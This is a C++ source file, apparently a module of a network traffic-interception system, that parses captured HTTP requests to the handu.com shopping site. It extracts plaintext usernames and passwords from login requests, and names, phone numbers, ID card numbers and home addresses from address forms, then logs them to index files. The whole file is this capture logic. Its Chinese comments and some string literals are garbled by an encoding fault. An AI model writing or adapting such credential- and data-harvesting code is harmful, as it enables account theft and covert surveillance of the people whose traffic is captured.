
#include "StdAfx.h"

#include "ShoppingHanDuYiShe.h"

shopping::HanDUYiShe::HanDUYiShe(HttpSession *http_session, const string &pro_name) : Shopping(http_session, pro_name)
{
	
}

shopping::HanDUYiShe::~HanDUYiShe()
{
	
}

int shopping::HanDUYiShe::IsHanDUYiShe(HttpSession *http_session)
{
	//pc������ַ �޸ĵ�ַ (��ַ����)
	if((http_session->m_Requestline.m_Host.Find("www.handu.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/user.php?act=ajax_save_address")!=-1))
	{
		return kPCWebEditAddress;
	}
	//pc������ַ �޸ĵ�ַ (�ύ����)
	if((http_session->m_Requestline.m_Host.Find("www.handu.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/flow.php?step=ajax_save_address")!=-1))
	{
		return kPCWebAddAddress;
	}
    //pc��¼
	if((http_session->m_Requestline.m_Host.Find("www.handu.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/user.php")!=-1))
	{
		return kPCLogin;
	}

	return 0;
}

int shopping::HanDUYiShe::Process(const char *packet,int action)
{
	if (action == kPCWebEditAddress)
	{
		return PCWebEditAddress(packet);
	}
	if (action == kPCWebAddAddress)
	{
		return PCWebAddAddress(packet);
	}
	if (action == kPCLogin)
	{
		return PCLogin(packet);
	}
	return 0;
}
//pc������ַ �޸ĵ�ַ (�ύ����)
int shopping::HanDUYiShe::PCWebAddAddress(const char *packet)
{
	string src_data(packet);
	src_data=ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	name_=ms_->GetValueFromMapByKey("consignee",true);
	//�绰
	phone_=ms_->GetValueFromMapByKey("mobile",true);	
	//���֤
	idcard_=ms_->GetValueFromMapByKey("idcard",true);	
    //��ַ
	address_= ms_->GetValueFromMapByKey("country",true) + "," +
			  ms_->GetValueFromMapByKey("province",true) + "," +
			  ms_->GetValueFromMapByKey("city",true) + "," +
			  ms_->GetValueFromMapByKey("district",true) + "," +
			  ms_->GetValueFromMapByKey("address",true);
	//��ַid
	addressid_ = ms_->GetValueFromMapByKey("address_id",true);
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
    if (!addressid_.empty())
    {
		output_text_=
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ +"\r\n" + 
			"state=�޸ĵ�ַ\r\n";
    } 
    else
    {
		output_text_=
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=��ӵ�ַ\r\n";
    }
	WriteIndexFile();
	return 1;
}

//pc��ַ���� ������ַ �޸ĵ�ַ
int shopping::HanDUYiShe::PCWebEditAddress(const char *packet)
{
	string src_data(packet);
	src_data=ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//����
	name_=ms_->GetValueFromMapByKey("consignee",true);
	//�绰
	phone_=ms_->GetValueFromMapByKey("mobile",true);	
	//���֤
	idcard_=ms_->GetValueFromMapByKey("idcard",true);	
    //��ַ
	address_= ms_->GetValueFromMapByKey("province",true) + "," +
		ms_->GetValueFromMapByKey("city",true) + "," +
		ms_->GetValueFromMapByKey("district",true) + "," +
		ms_->GetValueFromMapByKey("address",true);
	//��ַid
	addressid_ = ms_->GetValueFromMapByKey("address_id",true);
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
    if (addressid_ != "0")
    {
		output_text_=
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ +"\r\n" + 
			"state=�޸ĵ�ַ\r\n";
    } 
    else
    {
		output_text_=
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"state=��ӵ�ַ\r\n";
    }
	WriteIndexFile();
	return 1;
}

int shopping::HanDUYiShe::PCLogin(const char *packet)
{
	//��ȡ ���ݲ���
	string src_data(packet);
	string src_dataEnd;
	if (src_data.rfind("username=") != string::npos )
	{
		src_dataEnd = src_data.substr(src_data.rfind("username="));
	}
	
	src_dataEnd = ms_->UTF8ToGBK(UrlDecode(src_dataEnd));
	ms_->SplitStringToMap(src_dataEnd,'&','=');
	//�û��� ����
	string user,pass;
	user = ms_->GetValueFromMapByKey("username",true);
	pass = ms_->GetValueFromMapByKey("password");

	if ( user.empty() || pass.empty())
	{
		return 0;
	}
	WriteVirtualIdentity(user,"����");
	
	output_text_ = 
		"user=" + user + "\r\n" + 
		"pass=" + pass + "\r\n" + 
		"state=��¼\r\n";	
	WriteIndexFile();
	return 1;
}


